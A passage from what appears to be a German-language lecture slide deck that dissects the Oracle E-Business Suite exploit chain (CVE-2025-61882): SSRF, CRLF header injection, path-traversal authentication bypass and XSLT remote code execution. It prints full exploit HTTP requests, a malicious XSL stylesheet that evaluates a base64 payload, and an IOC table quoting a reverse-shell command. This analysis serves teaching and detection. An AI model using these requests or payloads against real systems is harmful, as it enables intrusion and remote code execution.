</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">  </span><span class="punctuation">}</span><span class="whitespace"> </span><span class="keyword">catch</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">Exception</span><span class="whitespace"> </span><span class="name">exception</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="punctuation">...</span><span class="whitespace"> </span><span class="punctuation">}</span><span class="whitespace"> </span><span class="punctuation">}</span></code></pre>
<p><strong>Analyse</strong></p>
<p>Der Parameter wird ungefiltert an die <code class="java"><span class="punctuation">.</span><span class="name attribute">connect</span><span class="punctuation">(...)</span></code> Methode übergeben.</p>
</ld-card><ld-card class="incremental">
<p class="rubric">Beispielhafte Anfrage</p>
<pre class="code http literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="name function">POST</span> <span class="name namespace">/OA_HTML/configurator/UiServlet</span> <span class="keyword reserved">HTTP</span><span class="operator">/</span><span class="literal number">1.1</span>
</code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="name attribute">Host</span><span class="operator">:</span> <span class="literal">{{Hostname}}</span>
</code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="name attribute">Content-Type</span><span class="operator">:</span> <span class="literal">application/x-www-form-urlencoded</span>
</code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="name attribute">Content-Length</span><span class="operator">:</span> <span class="literal">407</span>
</code><small class="ln"> 5 </small><code data-lineno=" 5 ">
</code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="name tag">redirectFromJsp</span><span class="operator">=</span><span class="literal string">1</span><span class="punctuation">&amp;</span><span class="name tag">getUiType</span><span class="operator">=</span><span class="literal string">&lt;&#64;urlencode_all&gt;&lt;?xml version</span><span class="operator">=</span><span class="literal string">&quot;1.0&quot; encoding</span><span class="operator">=</span><span class="literal string">&quot;UTF-8&quot;?&gt;
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="literal string">&lt;initialize&gt;
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;init_was_saved&quot;&gt;test&lt;/param&gt;
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;return_url&quot;&gt;http://{{external-host}}&lt;/param&gt;
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="literal string">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="literal string">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;ui_def_id&quot;&gt;0&lt;/param&gt;
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;config_effective_usage_id&quot;&gt;0&lt;/param&gt;
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;ui_type&quot;&gt;Applet&lt;/param&gt;
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="literal string">&lt;/initialize&gt;&lt;/&#64;urlencode_all&gt;</span></code></pre>
</ld-card></ld-deck></ld-card><ld-card class="incremental">
<p class="rubric">2. Carriage Return/Line Feed (CRLF) Injection</p>
<ld-deck>
<ld-card>
<p class="rubric">Beispielanfrage</p>
<pre class="code http literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="name function">POST</span> <span class="name namespace">/OA_HTML/configurator/UiServlet</span> <span class="keyword reserved">HTTP</span><span class="operator">/</span><span class="literal number">1.1</span>
</code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="name attribute">Host</span><span class="operator">:</span> <span class="literal">{{Hostname}}</span>
</code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="name attribute">Content-Type</span><span class="operator">:</span> <span class="literal">application/x-www-form-urlencoded</span>
</code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="name attribute">Content-Length</span><span class="operator">:</span> <span class="literal">524</span>
</code><small class="ln"> 5 </small><code data-lineno=" 5 ">
</code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="name tag">redirectFromJsp</span><span class="operator">=</span><span class="literal string">1</span><span class="punctuation">&amp;</span><span class="name tag">getUiType</span><span class="operator">=</span><span class="literal string">&lt;&#64;urlencode&gt;&lt;?xml version</span><span class="operator">=</span><span class="literal string">&quot;1.0&quot; encoding</span><span class="operator">=</span><span class="literal string">&quot;UTF-8&quot;?&gt;
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="literal string">&lt;initialize&gt;
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;init_was_saved&quot;&gt;test&lt;/param&gt;
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;return_url&quot;&gt;&lt;http://attacker-oob-server&gt;</span><span class="punctuation">&amp;</span><span class="error">#47;HeaderInjectionTest</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span><span class="error">    &amp;#32;HTTP&amp;#47;1&amp;#46;1&amp;#13;&amp;#10;InjectedHeader&amp;#58;Injected&amp;#13;&amp;#10;&amp;#32;&amp;#13</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace"></span><span class="error">    ;&amp;#10;&amp;#13;&amp;#13;&amp;#10;&amp;#13;&amp;#13;&amp;#10;&amp;#13;&amp;#13;&amp;#10;POST&amp;#32;&amp;</span><span class="name tag">#47;&lt;/param&gt;
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="name tag">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;ui_def_id&quot;&gt;0&lt;/param&gt;
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;config_effective_usage_id&quot;&gt;0&lt;/param&gt;
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;ui_type&quot;&gt;Applet&lt;/param&gt;
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="literal string">&lt;/initialize&gt;&lt;/&#64;urlencode&gt;</span></code></pre>
</ld-card><ld-card class="incremental">
<p class="rubric">Validierung der Injection mittels lokalem Server</p>
<pre class="code bash literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="operator">[</span>root&#64;oob-server<span class="operator">]</span><span class="comment single"># python3 server.py 80
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="comment single"></span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span><span class="operator">[</span>*<span class="operator">]</span><span class="whitespace"> </span>Serving<span class="whitespace"> </span>raw<span class="whitespace"> </span>HTTP<span class="whitespace"> </span>on<span class="whitespace"> </span>port<span class="whitespace"> </span><span class="name variable">80</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace"></span><span class="operator">==================================================</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace"></span>DUMPING<span class="whitespace"> </span>RAW<span class="whitespace"> </span>HTTP<span class="whitespace"> </span>REQUEST<span class="whitespace"> </span>from<span class="whitespace"> </span>oracle-business-ip:19080<span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span>POST<span class="whitespace"> </span>/HeaderInjectionTest<span class="whitespace"> </span>HTTP/1.1<span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span>---<span class="whitespace"> </span>HEADERS<span class="whitespace"> </span>---<span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace"></span>InjectedHeader:<span class="whitespace"> </span>Injected</code></pre>
<aside class="admonition incremental attention">
<p class="admonition-title">Achtung!</p>
<p>Es ist somit den Angreifern gelungen HTTP POST Requests durchzuführen!</p>
</aside>
</ld-card><ld-card class="incremental">
<p><strong>Analyse</strong></p>
<p>Der Angreifer kann beliebige Requests durchführen. Weiterhin ist der Angreifer in der Lage HTTP persistent connections zu nutzen (bisher nicht gezeigt; siehe finale Anfrage), was die Erkennungsmöglichkeiten weiter erschwert.</p>
</ld-card></ld-deck><div class="supplemental docutils container">
<p>CRLF Injection im Zusammenhang mit einem SSRF kann eine Möglichkeit sein, Header und Parameter einzufügen, die sonst über die URL nicht kontrollierbar wären.</p>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">3. Authentication Filter Bypass</p>
<ld-deck>
<ld-card>
<p class="rubric">Ausgangssituation</p>
<p>Eine typische Oracle E-Business Suite-Bereitstellung macht den Kern der Anwendung innerhalb eines HTTP-Dienstes zugänglich, der lokal an Port 7201/TCP gebunden ist über eine private IP Adresse (nicht <span class="docutils literal">localhost</span>).</p>
<aside class="admonition question">
<p class="admonition-title">Frage</p>
<p>Wie kommt man an diese IP Adresse?</p>
</aside>
<aside class="admonition incremental remark">
<p class="admonition-title">Bemerkung</p>
<p>Oracle EBS hat immer den folgenden Eintrag in der /etc/hosts Datei:</p>
<pre class="literal-block"># cat /etc/hosts
172.31.28.161   apps.example.com        apps</pre>
<p>Die lokale IP ist somit an apps.example.com gebunden.</p>
</aside>
</ld-card><ld-card class="incremental">
<p><strong>Analyse</strong></p>
<p>Wir können somit Anfragen an <code class="http"><span class="error">http://apps.example.com:7201</span></code> stellen und erhalten Zugriff auf zahlreiche jsps und servlets.</p>
<div class="incremental compound">
<p>Die Exploit-Kette nutzt als nächstes ein <em>Path Traveral</em>, um den Java-App-Filter zu umgehen, da der Pfad /help/ keine Authentifizierung erfordert. Durch Anhängen von ../ und der Zieldatei/dem Ziel-Servlet an eine an /OA_HTML/help/ gesendete HTTP-Anfrage kann die Exploit-Kette die Authentifizierungs-Whitelist umgehen.</p>
</div>
</ld-card></ld-deck></ld-card><ld-card class="incremental">
<p class="rubric">4. XSL Transformation (XSLT)</p>
<ld-deck>
<ld-card>
<p>Zielservlet: <span class="docutils literal"><span class="pre">/OA_HTML/help/../ieshostedsurvey.jsp</span></span></p>
<p>Der Code erstellt aus dem eingehenden <code class="http"><span class="error">Host:</span></code> Header eine Remote-URL, wodurch der Java-Code /<span class="docutils literal">ieshostedsurvey.xsl</span> vom Server des Angreifers herunterlädt.</p>
<aside class="admonition remark">
<p class="admonition-title">Bemerkung</p>
<p>Da die XSLT-Verarbeitung in Java Templates und Erweiterungsfunktionen aufrufen kann, ermöglicht dies ein nicht vertrauenswürdiges Stylesheet zu laden und erlaubt dem Angreifer Remote Code Execution.</p>
</aside>
</ld-card></ld-deck></ld-card><ld-card class="incremental">
<p><strong>Vollständiger Request zum Triggern der Schwachstelle</strong></p>
<ld-scrollable data-height="50%">
<pre class="code http literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="name function">POST</span> <span class="name namespace">/OA_HTML/configurator/UiServlet</span> <span class="keyword reserved">HTTP</span><span class="operator">/</span><span class="literal number">1.1</span>
</code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="name attribute">Host</span><span class="operator">:</span> <span class="literal">not-actually-watchtowr.com-stop-emailing-us-about-iocs:8000</span>
</code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="name attribute">User-Agent</span><span class="operator">:</span> <span class="literal">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span>
</code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="name attribute">Accept-Encoding</span><span class="operator">:</span> <span class="literal">gzip, deflate, br</span>
</code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="name attribute">Accept</span><span class="operator">:</span> <span class="literal">*/*</span>
</code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="name attribute">Connection</span><span class="operator">:</span> <span class="literal">keep-alive</span>
</code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="name attribute">CSRF-XHR</span><span class="operator">:</span> <span class="literal">YES</span>
</code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="name attribute">FETCH-CSRF-TOKEN</span><span class="operator">:</span> <span class="literal">1</span>
</code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="name attribute">Cookie</span><span class="operator">:</span> <span class="literal">JSESSIONID=_NG5Yg8cBERFjA5L23s9UUyzG7G8hSZpYkmc6YAEBjT71alQ2UH6!906988146; EBSDB=oSVgJCh0YacxUZCwOlLajtL2zo</span>
</code><small class="ln">10 </small><code data-lineno="10 "><span class="name attribute">Content-Length</span><span class="operator">:</span> <span class="literal">847</span>
</code><small class="ln">11 </small><code data-lineno="11 "><span class="name attribute">Content-Type</span><span class="operator">:</span> <span class="literal">application/x-www-form-urlencoded</span>
</code><small class="ln">12 </small><code data-lineno="12 ">
</code><small class="ln">13 </small><code data-lineno="13 "><span class="name tag">redirectFromJsp</span><span class="operator">=</span><span class="literal string">1</span><span class="punctuation">&amp;</span><span class="name tag">getUiType</span><span class="operator">=</span><span class="literal string">&lt;&#64;urlencode&gt;&lt;?xml version</span><span class="operator">=</span><span class="literal string">&quot;1.0&quot; encoding</span><span class="operator">=</span><span class="literal string">&quot;UTF-8&quot;?&gt;
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="literal string">&lt;initialize&gt;
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;init_was_saved&quot;&gt;test&lt;/param&gt;
</span></code><small class="ln">16 </small><code data-lineno="16 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;return_url&quot;&gt;&lt;http://apps.example.com:7201&gt;&lt;&#64;html_entities&gt;/OA_HTML/help/../ieshostedsurvey.jsp HTTP/1.2
</span></code><small class="ln">17 </small><code data-lineno="17 "><span class="literal string">Host: attacker-oob-server
</span></code><small class="ln">18 </small><code data-lineno="18 "><span class="literal string">User-Agent: anything
</span></code><small class="ln">19 </small><code data-lineno="19 "><span class="literal string">Connection: keep-alive
</span></code><small class="ln">20 </small><code data-lineno="20 "><span class="literal string">Cookie: JSESSIONID</span><span class="operator">=</span><span class="literal string">_NG5Yg8cBERFjA5L23s9UUyzG7G8hSZpYkmc6YAEBjT71alQ2UH6!906988146; EBSDB</span><span class="operator">=</span><span class="literal string">oSVgJCh0YacxUZCwOlLajtL2zo
</span></code><small class="ln">21 </small><code data-lineno="21 "><span class="literal string">
</span></code><small class="ln">22 </small><code data-lineno="22 "><span class="literal string">
</span></code><small class="ln">23 </small><code data-lineno="23 "><span class="literal string">POST /&lt;/&#64;html_entities&gt;&lt;/param&gt;
</span></code><small class="ln">24 </small><code data-lineno="24 "><span class="literal string">
</span></code><small class="ln">25 </small><code data-lineno="25 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;ui_def_id&quot;&gt;0&lt;/param&gt;
</span></code><small class="ln">26 </small><code data-lineno="26 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;config_effective_usage_id&quot;&gt;0&lt;/param&gt;
</span></code><small class="ln">27 </small><code data-lineno="27 "><span class="literal string">    &lt;param name</span><span class="operator">=</span><span class="literal string">&quot;ui_type&quot;&gt;Applet&lt;/param&gt;
</span></code><small class="ln">28 </small><code data-lineno="28 "><span class="literal string">&lt;/initialize&gt;&lt;/&#64;urlencode&gt;</span></code></pre>
</ld-scrollable></ld-card><ld-card class="incremental">
<p><strong>Vom Angreifer ausgeliefertes XSL</strong></p>
<pre class="code xslt literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword">&lt;xsl:stylesheet</span><span class="whitespace"> </span><span class="name attribute">version=</span><span class="literal string">&quot;1.0&quot;</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">    </span><span class="name attribute">xmlns:xsl=</span><span class="literal string">&quot;&lt;http://www.w3.org/1999/XSL/Transform&gt;&quot;</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">    </span><span class="name attribute">xmlns:b64=</span><span class="literal string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder&gt;&quot;</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="name attribute">xmlns:jsm=</span><span class="literal string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager&gt;&quot;</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">    </span><span class="name attribute">xmlns:eng=</span><span class="literal string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine&gt;&quot;</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">    </span><span class="name attribute">xmlns:str=</span><span class="literal string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/java.lang.String&gt;&quot;</span><span class="name tag">&gt;</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="keyword">&lt;xsl:template</span><span class="whitespace"> </span><span class="name attribute">match=</span><span class="literal string">&quot;/&quot;</span><span class="name tag">&gt;</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">        </span><span class="keyword">&lt;xsl:variable</span><span class="whitespace"> </span><span class="name attribute">name=</span><span class="literal string">&quot;bs&quot;</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">            </span><span class="name attribute">select=</span><span class="literal string">&quot;b64:decodeBuffer(b64:new(),'[base64_encoded_payload]')&quot;</span><span class="name tag">/&gt;</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">        </span><span class="keyword">&lt;xsl:variable</span><span class="whitespace"> </span><span class="name attribute">name=</span><span class="literal string">&quot;js&quot;</span><span class="whitespace"> </span><span class="name attribute">select=</span><span class="literal string">&quot;str:new($bs)&quot;</span><span class="name tag">/&gt;</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace">        </span><span class="keyword">&lt;xsl:variable</span><span class="whitespace"> </span><span class="name attribute">name=</span><span class="literal string">&quot;m&quot;</span><span class="whitespace"> </span><span class="name attribute">select=</span><span class="literal string">&quot;jsm:new()&quot;</span><span class="name tag">/&gt;</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">        </span><span class="keyword">&lt;xsl:variable</span><span class="whitespace"> </span><span class="name attribute">name=</span><span class="literal string">&quot;e&quot;</span><span class="whitespace"> </span><span class="name attribute">select=</span><span class="literal string">&quot;jsm:getEngineByName($m, 'js')&quot;</span><span class="name tag">/&gt;</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace">        </span><span class="keyword">&lt;xsl:variable</span><span class="whitespace"> </span><span class="name attribute">name=</span><span class="literal string">&quot;code&quot;</span><span class="whitespace"> </span><span class="name attribute">select=</span><span class="literal string">&quot;eng:eval($e, $js)&quot;</span><span class="name tag">/&gt;</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace">        </span><span class="keyword">&lt;xsl:value-of</span><span class="whitespace"> </span><span class="name attribute">select=</span><span class="literal string">&quot;$code&quot;</span><span class="name tag">/&gt;</span><span class="whitespace">
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="whitespace">    </span><span class="keyword">&lt;/xsl:template&gt;</span><span class="whitespace">
</span></code><small class="ln">16 </small><code data-lineno="16 "><span class="whitespace"></span><span class="keyword">&lt;/xsl:stylesheet&gt;</span></code></pre>
</ld-card><ld-card class="incremental">
<p class="rubric">Fragwürdige <em>Indicators of Compromise</em> (IOCs)</p>
<blockquote class="epigraph">
<p>The following indicators of compromise represent observed activity (not limited to CVE-2025-61882) and are provided to accelerate detection, threat hunting, and containment.</p>
<table class="booktabs s-font-size-80" style="width: 100%;">
<thead>
<tr><th class="head"><p>Indicator</p></th>
<th class="head"><p>Type</p></th>
<th class="head"><p>Description</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>200[.]107[.]207[.]26</p></td>
<td><p>IP</p></td>
<td><p>Potential GET and POST activity</p></td>
</tr>
<tr><td><p>185[.]181[.]60[.]11</p></td>
<td><p>IP</p></td>
<td><p>Potential GET and POST activity</p></td>
</tr>
<tr><td><p>sh -c /bin/bash -i &gt;&amp; /dev/tcp// 0&gt;&amp;1</p></td>
<td><p>Command</p></td>
<td><p>Establish an outbound TCP connection over a specific port</p></td>
</tr>
<tr><td><p>76b6d36e04e367a23[...]ca0f31235d</p></td>
<td><p>SHA 256</p></td>
<td><p>oracle_ebs_nday_exploit_poc
_scattered_lapsus_retard_cl0p
_hunters.zip</p></td>
</tr>
<tr><td><p>aa0d3859d6633b62b[...]0c73d41121</p></td>
<td><p>SHA 256</p></td>
<td><p>oracle_ebs_nday_exploit_poc
_scattered_lapsus_retard-cl0p_hunters/exp.py</p></td>
</tr>
<tr><td><p>6fd538e4a8e3493dd[...]f34b882c1b</p></td>
<td><p>SHA 256</p></td>
<td><p>oracle_ebs_nday_exploit_poc
_scattered_lapsus_retard-cl0p_hunters/server.py</p></td>
</tr>
</tbody>
</table>
</blockquote>
</ld-card></ld-deck></ld-topic>
</template>
</body>
</html>
